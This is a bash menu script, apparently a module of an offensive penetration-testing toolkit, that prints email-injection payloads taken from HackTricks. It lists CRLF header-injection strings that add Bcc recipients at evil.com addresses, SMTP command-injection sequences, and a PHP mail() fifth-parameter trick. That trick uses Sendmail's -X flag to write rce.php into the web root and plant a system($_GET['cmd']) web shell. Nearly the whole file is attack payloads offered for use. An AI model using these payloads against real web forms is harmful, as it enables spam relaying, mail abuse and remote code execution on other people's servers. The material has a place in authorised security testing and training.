#!/bin/bash
# HackTricks Ref: email-injection
# Module: Email Injection / SMTP Header Manipulation

echo -e "${C6}[WEB ATTACK: EMAIL_INJECTION]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/email-injection"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Injection Vector:${NC}"
echo "1) Header Injection (BCC/CC/To Manipulation)"
echo "2) Subject/Body Injection"
echo "3) SMTP Command Injection (CRLF Injection)"
echo "4) PHP mail() Exploitation (Extra Parameters)"
echo "0) Exit"

read -p "Selection: " mail_opt

case $mail_opt in
    1)
        echo -e "\n${C2}[*] Header Injection (Spamming):${NC}"
        echo "Inject extra headers using CRLF (%0A or %0D%0A):"
        echo "Payload for 'Subject' or 'Name' field:"
        echo "  ContactForm\nBcc: spam-victim@evil.com,another@evil.com"
        echo "  ContactForm%0ABcc: attacker@evil.com"
        ;;
    2)
        echo -e "\n${C2}[*] Subject/Body Manipulation:${NC}"
        echo "Injecting into the subject to alter the message content:"
        echo "  Subject: Inquiry%0A%0AThis is now the body of the email!"
        ;;
    3)
        echo -e "\n${C2}[*] SMTP Command Injection:${NC}"
        echo "If the app communicates directly with an SMTP server:"
        echo "Injecting commands like DATA, RCPT TO, or VRFY:"
        echo "  victim@target.com%0adata%0a. %0amail from: attacker@evil.com..."
        ;;
    4)
        echo -e "\n${C2}[*] PHP mail() - 5th Parameter:${NC}"
        echo "If the 5th parameter (additional_parameters) is user-controlled:"
        echo "Try to write a file using Sendmail's -X log flag:"
        echo "  -fattacker@evil.com -X/var/www/html/rce.php"
        echo "Then send a 'message' containing PHP code: <?php system(\$_GET['cmd']); ?>"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
